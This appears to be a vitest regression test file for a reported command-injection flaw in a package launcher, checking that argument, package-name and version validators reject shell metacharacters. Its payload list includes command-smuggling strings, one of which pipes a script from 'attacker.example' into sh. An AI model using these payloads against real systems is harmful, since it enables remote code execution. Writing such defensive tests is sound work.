import { describe, expect, it } from 'vitest';

import { validatePackageName, validatePackageVersion } from '@/lib/security/package-name';
import { validateCommandArgs } from '@/lib/security/validators';

/**
 * Regression tests for the command injection reported by Syed Anas Mohiuddin
 * (2026-09-01): a shell metacharacter inside a user-supplied `args` entry was
 * lifted out as the "package name" and interpolated into an `exec()` string,
 * so `npx` + `["evil; touch /tmp/PWNED #"]` ran as two shell statements.
 *
 * `validateCommand` has always rejected metacharacters; `validateCommandArgs`
 * did not, and the payload lives in args. These cover the gate. The handlers no
 * longer use a shell at all — see command-injection-handlers.test.ts.
 */
const INJECTION_PAYLOADS = [
  'evil-package; touch /tmp/PWNED #',
  'pkg && curl attacker.example/x | sh',
  'pkg`id`',
  'pkg$(id)',
  'pkg|whoami',
  'pkg>out.txt',
  'pkg<in.txt',
  'pkg{a,b}',
  'pkg&background',
  'pkg\nsecond-line',
];

const LEGITIMATE_ARGS = [
  '-y',
  '--port',
  '8080',
  '@modelcontextprotocol/server-filesystem',
  'mcp-server-git',
  '/home/user/some path/dir',
  'server_name-1.2.3',
  '--config=value',
  'https://example.com/sse',
];

describe('validateCommandArgs shell metacharacters', () => {
  it.each(INJECTION_PAYLOADS)('rejects %j', (payload) => {
    const result = validateCommandArgs([payload]);

    expect(result.valid).toBe(false);
    expect(result.sanitizedArgs).toBeUndefined();
  });

  it('rejects a payload hidden behind legitimate leading flags', () => {
    const result = validateCommandArgs(['-y', '--silent', 'evil; touch /tmp/PWNED #']);

    expect(result.valid).toBe(false);
  });

  it.each(LEGITIMATE_ARGS)('still accepts %j', (arg) => {
    const result = validateCommandArgs([arg]);

    expect(result.valid).toBe(true);
    expect(result.sanitizedArgs).toEqual([arg]);
  });

  it('keeps rejecting null bytes and overlong args', () => {
    expect(validateCommandArgs(['a\0b']).valid).toBe(false);
    expect(validateCommandArgs(['x'.repeat(4097)]).valid).toBe(false);
  });
});

describe('validatePackageName', () => {
  it.each(INJECTION_PAYLOADS)('rejects %j', (payload) => {
    expect(validatePackageName(payload).valid).toBe(false);
  });

  it.each([
    '@modelcontextprotocol/server-filesystem',
    'mcp-server-git',
    'express',
    'some.package',
    'pkg_underscore',
    'ghcr.io/veriteknik/pluggedin-app',
    'node:20-alpine',
  ])('accepts %j', (name) => {
    expect(validatePackageName(name).valid).toBe(true);
  });

  it('rejects an empty name and a leading dash', () => {
    expect(validatePackageName('').valid).toBe(false);
    expect(validatePackageName('-rf').valid).toBe(false);
  });
});

describe('validatePackageVersion', () => {
  it.each(['1.2.3', 'latest', '^2.0.0', '1.0.0-beta.1', '20-alpine'])('accepts %j', (v) => {
    expect(validatePackageVersion(v).valid).toBe(true);
  });

  it.each(['1.0.0; id', '$(id)', '`id`', 'v1|whoami'])('rejects %j', (v) => {
    expect(validatePackageVersion(v).valid).toBe(false);
  });
});
